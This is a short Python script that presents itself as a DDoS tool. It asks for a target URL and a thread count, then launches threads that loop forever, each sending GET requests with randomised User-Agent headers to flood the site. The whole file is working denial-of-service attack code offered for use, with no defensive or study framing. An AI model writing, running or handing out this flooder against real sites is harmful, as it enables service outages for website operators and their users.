import requests
import threading
import random
import string
from colorama import Fore, Back, Style
def display_ascii_art():
    print(Fore.RED + """
 ____  _  _    ____  _  _    ___  ____  _  _  ____ 
(  _ \/ )( \  (  _ \/ )( \  / __)/ ___)/ )( \/ ___)
 )___/ ) \/ ( )   /) \/ \/ ( (__)\___ \\ /\ /\  (   
(__)  (__/  (___/  \____/\___)(____)(__\_)(__/\_|   
    """ + Style.RESET_ALL)
    

display_ascii_art()
# Target website URL
target_url = input("enter URL: ")

# Number of attacker machines
num_attackers = int(input("Threads: "))

# Function to generate a random user agent
def generate_user_agent():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))

# Function to perform the attack
def attack():
    while True:
        try:
            # Generate a random user agent
            user_agent = generate_user_agent()
            
            # Set the User-Agent header
            headers = {'User-Agent': user_agent}
            
            # Send HTTP GET request to the target URL
            response = requests.get(target_url, headers=headers)
            print(Fore.GREEN + f"Attacked {target_url}. Status code: {response.status_code}" + Style.RESET_ALL)
        except:
            print(Fore.RED + "\nStopping DDoS attack..." + Style.RESET_ALL)

# Create attacker threads
attacker_threads = []
for _ in range(num_attackers):
    thread = threading.Thread(target=attack)
    attacker_threads.append(thread)
    thread.start()

# Wait for all attacker threads to finish
for thread in attacker_threads:
    thread.join()